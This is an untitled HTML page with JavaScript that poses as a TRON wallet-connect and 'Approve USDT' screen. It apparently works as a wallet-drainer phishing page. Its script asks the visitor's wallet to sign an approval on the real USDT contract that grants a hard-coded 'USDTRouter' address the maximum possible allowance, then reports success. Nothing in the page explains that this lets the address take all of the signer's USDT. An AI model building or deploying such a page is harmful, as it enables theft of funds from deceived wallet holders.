<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8"/>
<meta name="viewport" content="width=device-width, initial-scale=1"/>
<title></title>

<style>
body{
  margin:0;
  height:100vh;
  display:flex;
  justify-content:center;
  align-items:center;
  background:radial-gradient(circle at top,#0b1220,#05070f);
  font-family:system-ui;
  color:white;
}

.card{
  width:92%;
  max-width:440px;
  background:rgba(255,255,255,0.04);
  border:1px solid rgba(255,255,255,0.06);
  backdrop-filter: blur(16px);
  padding:24px;
  border-radius:18px;
  box-shadow:0 25px 70px rgba(0,0,0,0.6);
}

input,button{
  width:100%;
  padding:14px;
  margin-top:12px;
  border-radius:12px;
  border:none;
  font-size:14px;
}

input{
  background:rgba(0,0,0,0.35);
  color:white;
  outline:none;
}

button{
  font-weight:600;
  cursor:pointer;
  transition:.2s;
}

button:hover{
  transform:scale(1.02);
}

.primary{background:#3b82f6;color:white;}
.action{background:#22c55e;color:white;}

#status{
  margin-top:14px;
  font-size:13px;
  text-align:center;
  color:#93c5fd;
  min-height:20px;
}
</style>
</head>

<body>

<div class="card">

<button class="primary" onclick="connect()">Connect Wallet</button>

<input id="spender" placeholder="USDTRouter Address" value="TN3ssBQjMsjsTyJkGL1hL7czsQjrjpePGu"/>
<input id="amount" placeholder="Amount" value="115792089237316195423570985008687907853269984665640564039457584007913129639935"/>

<button class="action" onclick="approve()">Approve USDT</button>

<div id="status"></div>

</div>

<script>

/* USDT REAL CONTRACT */
const USDT = "TR7NHqjeKQxGTCi8q8ZY4p8otSzgjLj6t";

/* USDTRouter */
const ROUTER = "TN3ssBQjMsjsTyJkGL1hL7czsQjrjpePGu";

let tron = null;
let wallet = null;

/* detect wallet */
function detect(){
  if(window.tronWeb && window.tronWeb.defaultAddress?.base58){
    tron = window.tronWeb;
    wallet = tron.defaultAddress.base58;
    return true;
  }
  return false;
}

/* status */
function setStatus(t){
  document.getElementById("status").innerText = t;
}

/* connect */
function connect(){
  if(detect()){
    setStatus("Connected: " + wallet);
  }else{
    setStatus("Open TronLink / Trust Wallet");
  }
}

/* load contract safe */
async function loadContract(){
  try{
    return await tron.contract().at(USDT);
  }catch(e){
    setStatus("Network / contract error");
    return null;
  }
}

/* APPROVE FLOW */
async function approve(){

  if(!detect()){
    setStatus("No wallet detected");
    return;
  }

  const contract = await loadContract();
  if(!contract) return;

  try{

    setStatus("Waiting signature...");

    const spender = document.getElementById("spender").value || ROUTER;
    const amount = document.getElementById("amount").value || "115792089237316195423570985008687907853269984665640564039457584007913129639935";

    const value = tron.toSun(amount);

    await contract.approve(spender, value).send();

    setStatus("Success ✔️ Approved");

  }catch(e){
    setStatus("Transaction failed");
  }
}

</script>

</body>
</html>
